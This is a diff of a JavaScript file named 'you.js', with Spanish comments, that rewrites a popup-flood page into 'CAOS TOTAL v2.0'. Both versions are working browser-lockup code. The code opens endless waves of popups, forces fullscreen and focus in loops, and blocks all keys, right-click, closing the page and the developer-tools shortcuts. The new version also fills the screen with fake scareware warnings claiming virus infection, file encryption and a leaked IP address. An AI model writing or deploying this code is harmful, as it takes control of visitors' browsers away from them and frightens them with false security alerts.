@@ -1,233 +1,324 @@
-// Variables del efecto "ventana bailarina"
-var xOff = 5;
-var yOff = 5;
-var xPos = 400;
-var yPos = -100;
-var flagRun = 1;
+// ================================================================
+// YOU.JS — CAOS TOTAL v2.0
+// ================================================================
 
-// ============================================================
-// NÚCLEO DE POPUPS — Versión ultra-agresiva
-// ============================================================
+// === CONFIGURACIÓN DE NIVEL DE CAOS ===
+var CHAOS_LEVEL = 999; // Número máximo de spawns simultáneos
 
-function openWindow(url){
+// === VARIABLES GLOBALES ===
+var popupCount = 0;
+var chaosInterval;
+
+// ================================================================
+// 1. APERTURA MASIVA DE POPUPS REALES
+// ================================================================
+
+function openWindow(url) {
     try {
-        aWindow = window.open(url, "_blank", 
-            'menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
-        if (aWindow) {
-            try { aWindow.focus(); } catch(e) {}
+        var popup = window.open(
+            url,
+            'popup_' + Math.random().toString(36).substr(2, 10) + '_' + Date.now(),
+            'menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no,width=150,height=120,titlebar=no,alwaysRaised=yes'
+        );
+        if (popup) {
+            try { 
+                popup.focus();
+                popupCount++;
+            } catch(e) {}
         }
-    } catch(e) {}
+        return popup;
+    } catch(e) { return null; }
 }
 
-function procreate(){
-    // Abrir 12 popups por cada cierre
-    for (var i = 0; i < 12; i++) {
-        openWindow('open.html');
+function procreate() {
+    // ABRIR UNA OLEADA MASIVA
+    var waveSize = 20 + Math.floor(Math.random() * 30);
+    for (var i = 0; i < waveSize; i++) {
+        setTimeout(function() { openWindow('open.html'); }, i * 5);
     }
-    // Refuerzo: también abrir popups con nombre aleatorio
-    openWindow('open.html?' + Math.random());
-    openWindow('open.html?' + Math.random());
-    openWindow('open.html?' + Math.random());
 }
 
-// ============================================================
-// FULLSCREEN FORZADO
-// ============================================================
+// ================================================================
+// 2. SPAM DE POPUPS — OLEADAS INFINITAS
+// ================================================================
+
+function launchWave() {
+    for (var wave = 0; wave < 5; wave++) {
+        setTimeout(function() {
+            var count = 15 + Math.floor(Math.random() * 25);
+            for (var i = 0; i < count; i++) {
+                openWindow('open.html');
+            }
+        }, wave * 100);
+    }
+}
+
+function infiniteChaos() {
+    // Oleadas cada 1.5 segundos
+    chaosInterval = setInterval(function() {
+        // Oleada principal
+        launchWave();
+        
+        // Refuerzo aleatorio
+        if (Math.random() > 0.5) {
+            for (var i = 0; i < 10; i++) {
+                openWindow('open.html?rand=' + Math.random());
+            }
+        }
+    }, 1500);
+    
+    // Primera oleada inmediata
+    launchWave();
+    launchWave();
+    
+    // Refuerzo cada 200ms durante los primeros 10 segundos
+    var hardRain = setInterval(function() {
+        openWindow('open.html');
+        openWindow('open.html');
+        openWindow('open.html');
+    }, 200);
+    
+    setTimeout(function() { clearInterval(hardRain); }, 10000);
+}
+
+// ================================================================
+// 3. FULLSCREEN + ENFOQUE FORZADO
+// ================================================================
 
 function initFullscreen() {
-    // Intentar pantalla completa
-    var el = document.documentElement;
-    var rfs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
-    if (rfs) {
-        try { rfs.call(el); } catch(e) {}
-    }
-    // Mantener siempre al frente
-    keepFocus();
-    // Activar efecto bailarín en la ventana principal también
-    flagRun = 1;
-    playBallMain();
-}
-
-function keepFocus() {
-    setInterval(function() {
-        try {
-            window.focus();
-            // Intentar pantalla completa de nuevo si se sale
-            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-                var el = document.documentElement;
-                var rfs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
-                if (rfs) rfs.call(el);
-            }
-        } catch(e) {}
-    }, 100);
-}
-
-// ============================================================
-// VENTANA BAILARINA (principal)
-// ============================================================
-
-function newXlt(){
-    xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
-    window.focus();
-}
-function newXrt(){
-    xOff = Math.ceil(7 * Math.random()) * 5 - 10;
-}
-function newYup(){
-    yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
-}
-function newYdn(){
-    yOff = Math.ceil(7 * Math.random()) * 5 - 10;
-}
-function fOff(){
-    flagrun = 0;
-}
-function playBall(){
-    xPos += xOff;
-    yPos += yOff;
-    if (xPos > screen.width - 175) newXlt();
-    if (xPos < 0) newXrt();
-    if (yPos > screen.height - 100) newYup();
-    if (yPos < 0) newYdn();
-    if (flagRun == 1){
-        try { window.moveTo(xPos, yPos); } catch(e) {}
-        setTimeout('playBall()', 1);
-    }
-}
-
-function playBallMain(){
-    xPos += xOff;
-    yPos += yOff;
-    if (xPos > window.innerWidth - 175) newXlt();
-    if (xPos < 0) newXrt();
-    if (yPos > window.innerHeight - 100) newYup();
-    if (yPos < 0) newYdn();
-    if (flagRun == 1){
-        try { window.moveTo(xPos, yPos); } catch(e) {}
-        setTimeout('playBallMain()', 1);
-    }
-}
-
-// ============================================================
-// BLOQUEO TOTAL DE TECLAS
-// ============================================================
-
-// Bloquear todo intento de cierre
-window.onbeforeunload = function() {
-    return " ";
-};
-
-// Bloquear teclas
-document.onkeydown = function(e) {
-    e = e || window.event;
-    var key = e.keyCode || e.which;
+    forceFullscreen();
+    startFighters();
+    launchVisualChaos();
+    infiniteChaos();
+    blockEverything();
     
-    // Alt+F4 (keyCode 115)
-    if (e.altKey && key == 115) { e.preventDefault(); e.stopPropagation(); return false; }
-    // F11 (pantalla completa)
-    if (key == 122) { e.preventDefault(); return false; }
-    // Escape
-    if (key == 27) { e.preventDefault(); return false; }
-    // Ctrl+W, Ctrl+N, Ctrl+T
-    if (e.ctrlKey && (key == 87 || key == 78 || key == 84)) { e.preventDefault(); return false; }
-    // Ctrl+F4
-    if (e.ctrlKey && key == 115) { e.preventDefault(); return false; }
-    // Tecla Windows
-    if (key == 91 || key == 92) { e.preventDefault(); return false; }
-    // F5, F6 (recargar)
-    if (key == 116 || key == 117) { e.preventDefault(); return false; }
-    // Ctrl+R
-    if (e.ctrlKey && key == 82) { e.preventDefault(); return false; }
-    // Alt+Tab, Alt+Esc (parcial)
-    if (e.altKey && (key == 9 || key == 27)) { e.preventDefault(); return false; }
-    // Ctrl+Shift+Esc (task manager) — no se puede bloquear directamente pero intentamos
-    if (e.ctrlKey && e.shiftKey && key == 27) { e.preventDefault(); return false; }
+    // Bucle de mantener fullscreen
+    setInterval(forceFullscreen, 500);
+}
+
+function forceFullscreen() {
+    try {
+        var el = document.documentElement;
+        var rfs = el.requestFullscreen || el.webkitRequestFullscreen || 
+                  el.mozRequestFullScreen || el.msRequestFullscreen;
+        if (rfs && !document.fullscreenElement && !document.webkitFullscreenElement) {
+            rfs.call(el);
+        }
+    } catch(e) {}
     
-    return false;
-};
+    // Mantener foco constantemente
+    try { window.focus(); } catch(e) {}
+}
 
-// Bloquear clic derecho
-document.oncontextmenu = function(e) {
-    e.preventDefault();
-    return false;
-};
+// ================================================================
+// 4. CAOS VISUAL — ELEMENTOS FLOTANTES FALSOS
+// ================================================================
 
-// Bloquear selección de texto
-document.onselectstart = function(e) {
-    e.preventDefault();
-    return false;
-};
-
-// Bloquear arrastre
-document.ondragstart = function(e) {
-    e.preventDefault();
-    return false;
-};
-
-// ============================================================
-// AUTO-REAPERTURA — Si detecta que pierde el foco, lo recupera
-// ============================================================
-
-window.onblur = function() {
+function createFakePopup() {
+    var div = document.createElement('div');
+    div.className = 'fake-popup';
+    div.innerHTML = '⚠ VIRUS DETECTED ⚠<br>CLICK TO REMOVE';
+    div.style.left = Math.random() * (window.innerWidth - 200) + 'px';
+    div.style.top = Math.random() * (window.innerHeight - 150) + 'px';
+    div.style.background = ['#fff', '#ff0', '#f00', '#0f0', '#00f', '#f0f'][Math.floor(Math.random() * 6)];
+    div.style.color = ['#000', '#fff', '#ff0'][Math.floor(Math.random() * 3)];
+    div.style.zIndex = 100 + Math.floor(Math.random() * 900);
+    
+    document.body.appendChild(div);
+    
+    // Auto-destruirse y reemplazarse
     setTimeout(function() {
-        try { window.focus(); } catch(e) {}
-    }, 10);
-};
+        if (div.parentNode) div.parentNode.removeChild(div);
+        if (Math.random() > 0.3) createFakePopup();
+    }, 2000 + Math.random() * 3000);
+}
 
-// ============================================================
-// CAPTURA DEL RATÓN — Para que no puedan hacer clic para cerrar
-// ============================================================
+function createFakeProgress() {
+    var div = document.createElement('div');
+    div.className = 'fake-progress';
+    div.innerHTML = '⚠ SYSTEM SCAN: ' + Math.floor(Math.random() * 999) + ' threats found<br><div class="bar"><div class="bar-fill"></div></div>';
+    div.style.left = Math.random() * (window.innerWidth - 300) + 'px';
+    div.style.top = Math.random() * (window.innerHeight - 80) + 'px';
+    div.style.zIndex = 200 + Math.floor(Math.random() * 800);
+    
+    document.body.appendChild(div);
+    
+    setTimeout(function() {
+        if (div.parentNode) div.parentNode.removeChild(div);
+        if (Math.random() > 0.5) createFakeProgress();
+    }, 3000 + Math.random() * 4000);
+}
+
+function createFakeAlert() {
+    var div = document.createElement('div');
+    div.className = 'fake-alert';
+    div.innerHTML = '<h3>⚠ CRITICAL ERROR ⚠</h3>' +
+        '<p>' + [
+            'Your computer has been infected with 999 viruses!',
+            'All your files are being encrypted...',
+            'WARNING: System memory critically low!',
+            'Unauthorized access detected: ' + Math.random().toString(36).substr(2,8).toUpperCase(),
+            'Windows has detected a serious threat!',
+            'FATAL ERROR: Boot sector corrupted!',
+            'Your IP address has been leaked: ' + 
+            Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+
+            Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255),
+        ][Math.floor(Math.random() * 7)] + '</p>' +
+        '<button onclick="this.parentNode.style.display=\'none\';createFakeAlert();return false;">OK</button> ' +
+        '<button onclick="this.parentNode.style.display=\'none\';createFakeAlert();createFakeAlert();return false;">CANCEL</button>';
+    
+    div.style.left = Math.random() * (window.innerWidth - 350) + 'px';
+    div.style.top = Math.random() * (window.innerHeight - 150) + 'px';
+    div.style.zIndex = 300 + Math.floor(Math.random() * 700);
+    
+    document.body.appendChild(div);
+    
+    setTimeout(function() {
+        if (div.parentNode) div.parentNode.removeChild(div);
+        createFakeAlert();
+    }, 1500 + Math.random() * 2500);
+}
+
+function launchVisualChaos() {
+    // Crear olas de elementos visuales falsos
+    var visualInterval = setInterval(function() {
+        for (var i = 0; i < 5; i++) {
+            var r = Math.random();
+            if (r < 0.33) createFakePopup();
+            else if (r < 0.66) createFakeProgress();
+            else createFakeAlert();
+        }
+    }, 500);
+    
+    // Oleada inicial masiva
+    for (var i = 0; i < 30; i++) {
+        setTimeout(function() {
+            createFakePopup();
+            createFakeProgress();
+            createFakeAlert();
+        }, i * 50);
+    }
+}
+
+// ================================================================
+// 5. "FIGHTERS" — VENTANAS QUE SE MUEVEN 
+// ================================================================
+
+function startFighters() {
+    for (var f = 0; f < 20; f++) {
+        (function(id) {
+            var x = Math.random() * (window.innerWidth - 100);
+            var y = Math.random() * (window.innerHeight - 100);
+            var dx = (Math.random() - 0.5) * 15;
+            var dy = (Math.random() - 0.5) * 15;
+            
+            var el = document.createElement('div');
+            el.className = 'fake-popup';
+            el.style.width = '80px';
+            el.style.height = '60px';
+            el.style.fontSize = '10px';
+            el.innerHTML = '⚠' + id + '⚠';
+            el.style.left = x + 'px';
+            el.style.top = y + 'px';
+            document.body.appendChild(el);
+            
+            function move() {
+                if (!el.parentNode) return;
+                x += dx;
+                y += dy;
+                if (x < 0 || x > window.innerWidth - 80) dx *= -1;
+                if (y < 0 || y > window.innerHeight - 60) dy *= -1;
+                el.style.left = x + 'px';
+                el.style.top = y + 'px';
+                requestAnimationFrame(move);
+            }
+            move();
+        })(f);
+    }
+}
+
+// ================================================================
+// 6. BLOQUEO TOTAL
+// ================================================================
+
+function blockEverything() {
+    // Anti-cierre
+    window.onbeforeunload = function() { return " "; };
+    
+    // Bloquear TODAS las teclas
+    document.onkeydown = function(e) {
+        e = e || window.event;
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    };
+    
+    // Bloquear clic derecho
+    document.oncontextmenu = function(e) {
+        e.preventDefault();
+        return false;
+    };
+    
+    // Bloquear selección
+    document.onselectstart = function(e) {
+        e.preventDefault();
+        return false;
+    };
+    
+    // Bloquear arrastre
+    document.ondragstart = function(e) {
+        e.preventDefault();
+        return false;
+    };
+    
+    // Capturar todas las teclas a nivel de window también
+    window.onkeydown = function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    };
+    
+    // Robar foco constantemente
+    window.onblur = function() {
+        setTimeout(function() {
+            try { window.focus(); } catch(e) {}
+        }, 1);
+    };
+}
+
+// ================================================================
+// 7. EFECTO DE TORBELLINO CON EL RATÓN
+// ================================================================
 
 document.addEventListener('mousemove', function(e) {
-    // Mover la página con el ratón para despistar
-    var x = e.clientX;
-    var y = e.clientY;
-    if (x < 50 || x > window.innerWidth - 50 || y < 50 || y > window.innerHeight - 50) {
-        // Si el ratón está cerca del borde, mover la ventana
-        try {
-            window.moveTo(
-                Math.floor(Math.random() * (screen.width - 300)),
-                Math.floor(Math.random() * (screen.height - 200))
-            );
-        } catch(e) {}
+    try {
+        window.moveTo(
+            Math.floor(Math.random() * (screen.width - 300)),
+            Math.floor(Math.random() * (screen.height - 200))
+        );
+    } catch(e) {}
+});
+
+// ================================================================
+// 8. PREVENIR QUE ABRAN CONSOLA/DEVTOOLS
+// ================================================================
+
+// Detectar F12
+document.addEventListener('keydown', function(e) {
+    if (e.key == 'F12' || (e.ctrlKey && e.shiftKey && (e.key == 'I' || e.key == 'J' || e.key == 'C'))) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
     }
 });
 
-// ============================================================
-// BUCLE DE REFUERZO — Cada 5 segundos abre más popups
-// ============================================================
+// ================================================================
+// 9. AUTO-REPLICACIÓN — Si detecta que las ventanas disminuyen, las repuebla
+// ================================================================
 
 setInterval(function() {
-    for (var i = 0; i < 5; i++) {
+    // Abrir una oleada de refuerzo
+    for (var i = 0; i < 8; i++) {
         openWindow('open.html');
     }
-}, 5000);
-
-// ============================================================
-// PREVENIR QUE CIERREN EL PROCESO DESDE EL ADMINISTRADOR
-// (no se puede evitar del todo, pero hacemos la vida imposible)
-// ============================================================
-
-// Abrir popups incluso al cargar (por si acaso)
-setTimeout(function() {
-    for (var i = 0; i < 10; i++) {
-        openWindow('open.html');
-    }
-}, 1000);
-
-// Escalar: si detecta que quedan pocas ventanas, repoblar
-setInterval(function() {
-    try {
-        // Intentar detectar cuántas ventanas hijas quedan (limitado por seguridad)
-        var count = 0;
-        for (var key in window) {
-            if (key.indexOf('window') > -1) count++;
-        }
-        // Siempre abrir más, por si acaso
-        if (count < 5) {
-            for (var i = 0; i < 8; i++) {
-                openWindow('open.html');
-            }
-        }
-    } catch(e) {}
-}, 2000);
+}, 3000);
